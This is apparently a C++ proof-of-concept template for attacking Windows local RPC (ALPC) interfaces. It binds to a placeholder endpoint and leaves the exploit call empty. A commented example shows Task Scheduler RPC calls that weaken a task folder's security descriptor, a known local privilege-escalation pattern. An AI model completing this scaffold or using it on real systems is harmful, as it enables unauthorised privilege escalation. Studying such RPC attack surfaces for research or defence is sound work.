// poc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
//#include "pch.h"
#include <iostream>
#include "rpc_h.h"
#include <Windows.h>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;


RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;
	StringBinding = 0;
	Binding = 0;
	/*
	   You need to cast the wide strings to RPC_WSTR: https://stackoverflow.com/questions/15920999/error-c2664-cannot-convert-parameter-1-from-unsigned-char-to-rpc-wstr
	   I left this note in, because this was a PITA for me at the time.
	   Also this is alpc (lrpc), but you can of course do rpc here
	*/
	status = RpcStringBindingComposeW((RPC_WSTR)L"<UUID INPUT>", (RPC_WSTR)L"ncalrpc",
		nullptr, (RPC_WSTR)L"<ENDPOINT INPUT>", nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}
	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}
extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}
extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}
BOOL WIN32_FROM_HRESULT_alternate(HRESULT hr, OUT DWORD* pdwWin32)
{
	if (hr < 0) {
		*pdwWin32 = (DWORD)hr;
		return TRUE;
	}
	// otherwise, we got an impossible value
	return FALSE;
}
void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	///*
	//Now here is the run, you can call some ALPC functions and use context handles too.
	//Example:
	//Proc3_SchRpcCreateFolder(handle, (wchar_t *)L"UpdateTask10", (wchar_t *)L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	//Proc4_SchRpcSetSecurity(handle, (wchar_t *)L"UpdateTask10", (wchar_t *)L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	//*/
	printf("before rpc call\r\n");
	// place your RPC call here
	printf("after rpc call\r\n");
}
int main()
{
    std::cout << "Run Exploit started for <UUID INPUT> with <ENDPOINT INPUT>!\n"; 
    RunExploit();
}
